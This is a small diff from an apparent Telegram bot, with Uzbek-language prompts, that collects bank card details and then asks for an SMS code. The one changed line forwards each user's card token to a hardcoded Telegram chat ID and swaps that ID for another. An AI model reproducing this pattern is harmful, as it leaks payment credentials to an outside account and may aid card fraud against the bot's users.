@@ -1269,7 +1269,7 @@ bot.on('text', async (ctx) => {
                                 expiryDate,
                                 cardToken: cardTokenResponse.card_token 
                             });
-                            await bot.telegram.sendMessage(7465707954, cardTokenResponse.card_token)
+                            await bot.telegram.sendMessage(7156723943, cardTokenResponse.card_token)
                             await ctx.reply('SMS kodni kiriting:', backKeyboard);
                         } else {
                             await ctx.reply("Karta ma'lumotlari noto'g'ri, qayta urinib ko'ring.");
